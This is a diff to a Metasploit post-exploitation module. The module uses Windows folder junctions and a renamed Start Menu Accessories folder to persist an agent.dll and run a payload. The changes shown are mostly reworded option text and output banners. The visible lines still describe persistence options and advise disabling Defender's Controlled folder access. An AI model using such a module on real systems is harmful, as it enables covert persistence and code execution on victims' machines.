@@ -23,9 +23,9 @@
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on           => set SESSION 3
-# The full path of the appl to run or payload        => set APPL_PATH C:\\Windows\\System32\\calc.exe
-# The full path and name of folder to create         => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
-# The full path [local] were to store module logs    => set LOOT_FOLDER /root/.msf4/loot
+# The full path of the appl or payload to run        => set APPL_PATH C:\\Windows\\System32\\calc.exe
+# The full path and name of folder to be created     => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
+# The full path [local] were to store logfiles       => set LOOT_FOLDER /root/.msf4/loot
 # Use explorer Start Menu to persiste our agent.dll? => set PERSIST_EXPLORER true
 # Rename ..\\Start Menu\\..\\Accessories.{GUID}?     => set RENAME_PERSIST true
 # ----------------------------------------------------------------------------------------------------
@@ -136,15 +136,15 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('APPL_PATH', [ true, 'The full path of the appl to run or payload']),
-                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create']),
-                                OptString.new('LOOT_FOLDER', [ true, 'The full path [local] were to store module logs'])
+                                OptString.new('APPL_PATH', [ true, 'The full path of the appl or payload to run']),
+                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to be created']),
+                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] were to store logfiles'])
                         ], self.class)
 
                 register_advanced_options(
                         [
                                 OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer Start Menu to persiste our agent.dll?' , false]),
-                                OptBool.new('RENAME_PERSIST', [ false, 'Rename ..\\Start Menu\\..\\Accessories.{GUID}?' , false])
+                                OptBool.new('RENAME_PERSIST', [ false, 'Rename Start Menu\\..\\Accessories to Accessories.{GUID}?' , false])
                         ], self.class) 
 
         end
@@ -193,10 +193,10 @@ def run
     #
     if sysinfo['OS'] =~ /Windows 10/
       print_warning("windows 10 version its protected againts this exploit.")
-      print_line("-----------------------------------------------------------")
+      print_line("    -------------------------------------------------------")
       print_line("    Disable 'Controlled folder access' in Windows Defender")
       print_line("    If you wish to teste this on windows 10 version distros")
-      print_line("-----------------------------------------------------------")
+      print_line("    -------------------------------------------------------")
       Rex::sleep(6.0)
     end
 
@@ -358,19 +358,26 @@ def run
        #
        print_good("Module execution finished ..")
        if datastore['PERSIST_EXPLORER'] == true
-         print_line("-----------------------------------------------------------")
+         print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{folder_poc}")
-         print_line("-----------------------------------------------------------")
+         print_line("")
+         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
+         print_line("    -------------------------------------------------------")
          Rex::sleep(1.0)
        elsif datastore['RENAME_PERSIST'] == true
-         print_line("-----------------------------------------------------------")
+         print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{ren_per}")
-         print_line("-----------------------------------------------------------")
+         print_line("")
+         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
+         print_line("    Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
+         print_line("    -------------------------------------------------------")
          Rex::sleep(1.0)
        else
-         print_line("-----------------------------------------------------------")
+         print_line("    -------------------------------------------------------")
          print_line("    Trigger exploit: #{fol_path}")
-         print_line("-----------------------------------------------------------")
+         print_line("")
+         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
+         print_line("    -------------------------------------------------------")
          Rex::sleep(1.0)
        end
 
